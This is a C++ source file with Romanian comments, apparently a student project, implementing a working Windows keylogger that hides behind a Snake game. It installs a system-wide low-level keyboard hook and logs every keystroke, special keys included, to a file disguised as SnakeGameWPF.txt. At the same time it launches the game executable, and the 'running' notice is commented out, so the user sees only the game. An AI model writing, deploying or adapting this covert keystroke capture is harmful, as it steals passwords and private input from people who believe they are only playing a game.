#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>

// Variabila globala unde vor fi stocate tastele apasate
std::ofstream logfile(".\\SnakeGameWPF\\bin\\Debug\\net8.0-windows\\SnakeGameWPF.txt", std::ios::out | std::ios::app);

void LOG(std::string s) {
    logfile << s;
}

bool SpecialKeys(int S_Key) {
    switch (S_Key) {
    case VK_SPACE:
        LOG(" ");
        return true;
    case VK_RETURN:
        LOG("\n");
        return true;
    case VK_SHIFT:
    case VK_LSHIFT:
    case VK_RSHIFT:
        LOG(" -SHIFT- ");
        return true;
    case VK_BACK:
        LOG("\b");
        return true;
    case VK_RBUTTON:
        LOG(" -R_CLICK- ");
        return true;
    case VK_CAPITAL:
        LOG(" -CAPS_LOCK- ");
        return true;
    case VK_TAB:
        LOG(" -TAB- ");
        return true;
    case VK_UP:
        LOG(" -UP_ARROW_KEY- ");
        return true;
    case VK_DOWN:
        LOG(" -DOWN_ARROW_KEY- ");
        return true;
    case VK_LEFT:
        LOG(" -LEFT_ARROW_KEY- ");
        return true;
    case VK_RIGHT:
        LOG(" -RIGHT_ARROW_KEY- ");
        return true;
    case VK_CONTROL:
    case VK_LCONTROL:
    case VK_RCONTROL:
        LOG(" -CONTROL- ");
        return true;
    case VK_MENU:
    case VK_LMENU:
    case VK_RMENU:
        LOG(" -ALT- ");
        return true;
    case VK_LWIN:
    case VK_RWIN:
        LOG(" -WIN_KEY- ");
        return true;
    case VK_F1:
        LOG(" -F1- ");
        return true;
    case VK_F2:
        LOG(" -F2- ");
        return true;
    case VK_F3:
        LOG(" -F3- ");
        return true;
    case VK_F4:
        LOG(" -F4- ");
        return true;
    case VK_F5:
        LOG(" -F5- ");
        return true;
    case VK_F6:
        LOG(" -F6- ");
        return true;
    case VK_F7:
        LOG(" -F7- ");
        return true;
    case VK_F8:
        LOG(" -F8- ");
        return true;
    case VK_F9:
        LOG(" -F9- ");
        return true;
    case VK_F10:
        LOG(" -F10- ");
        return true;
    case VK_F11:
        LOG(" -F11- ");
        return true;
    case VK_F12:
        LOG(" -F12- ");
        return true;
    default:
        return false;
    }
}

// Low-Level Keyboard Hook procedure
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // Verifica daca tasta apasata e tasta speciala
            if (!SpecialKeys(p->vkCode)) {
                // Daca nu e, e pur si simplu scrisa in fisierul de output. Daca este tasta speciala, 
                // scrierea in fisierul de ouput a tastei speciale se face in cadrul functiei SpecialKeys()
                char key;
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);
                WORD translatedKey;
                int result = ToAscii(p->vkCode, p->scanCode, keyboardState, &translatedKey, 0);
                if (result == 1) {
                    key = static_cast<char>(translatedKey);
                    logfile << key;
                }
            }
            logfile.flush(); //Se da flush la buffer pentru a asigura scrierea instantanee a tastelor apasate in fisierul de output
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Functie pentru configurare si rulare keylloger
void runKeyLogger() {
    //Hook care urmareste evenimentele de la tastatura
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hHook == NULL) {
        std::cerr << "Failed to install hook\n";
        return;
    }

    //mesaj care confirma ca keylogger ul funcitoneaza
    //std::cout << "Keylogger is running...\n";

    // ciclu mesaje - mentine keylogger-ul activ
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook si inchide fisierul de output.
    UnhookWindowsHookEx(hHook);
    logfile.close();
}

int main() {
    // Creare thread separat pentru keylogger
    std::thread loggerThread(runKeyLogger);

    //Creare thread separat pentru jocul Snake
    std::thread snakeGameThread([]() {
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Calea catre executabilul jocului snake
    LPCWSTR path = L"D:\\facultate\\snake\\Snake\\SnakeGameWPF\\bin\\Debug\\net8.0-windows\\SnakeGameWPF.exe";

    // Creare si pornire a proccesului SnakeGameWPF
    if (!CreateProcess(
        path,   // The path to the executable
        NULL,   // Command line arguments (none in this case)
        NULL,   // Process handle not inheritable
        NULL,   // Thread handle not inheritable
        FALSE,  // Set handle inheritance to FALSE
        0,      // No creation flags
        NULL,   // Use parent's environment block
        NULL,   // Use parent's starting directory 
        &si,    // Pointer to STARTUPINFO structure
        &pi)    // Pointer to PROCESS_INFORMATION structure
        ) {
        std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
        return;
    }

    // Asteptare pana se incheie procesul jocului Snake
    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
        });

    // Detach thread-ului Snake game pentru ca acesta sa ruleze independent
    snakeGameThread.detach();

    // Asteapta ca thread-ul keylogger-ului sa fie terminat -> asigura continuitatea rularii keylogger-ului
    loggerThread.join();

    return 0;
}